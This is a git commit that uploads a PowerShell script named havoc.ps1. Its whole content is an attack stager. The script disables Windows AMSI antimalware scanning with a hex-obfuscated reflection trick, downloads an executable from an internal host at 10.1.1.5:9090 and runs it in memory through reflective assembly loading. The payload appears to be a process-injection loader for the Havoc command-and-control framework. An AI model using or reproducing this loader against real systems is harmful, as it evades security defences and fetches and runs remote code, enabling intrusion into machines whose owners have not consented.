348dff1eaedf3aae102ca15b33d1642ea20e65b6
Amarjit Labhuram <amarjit.labhuram@gmail.com>
2023-07-16 19:56:07 +0300

    Add files via upload

---
+++ havoc.ps1
@@ -0,0 +1,7 @@
+# AMSI bypass
+[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+
+$bytes = (Invoke-WebRequest -useb "http://10.1.1.5:9090/program1_donutf7_havoc.exe").Content;
+$assembly = [System.Reflection.Assembly]::Load($bytes);
+$entryPointMethod = $assembly.GetType('QUserAPCProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
+$entryPointMethod.Invoke($null, (, [string[]] ('', '')));
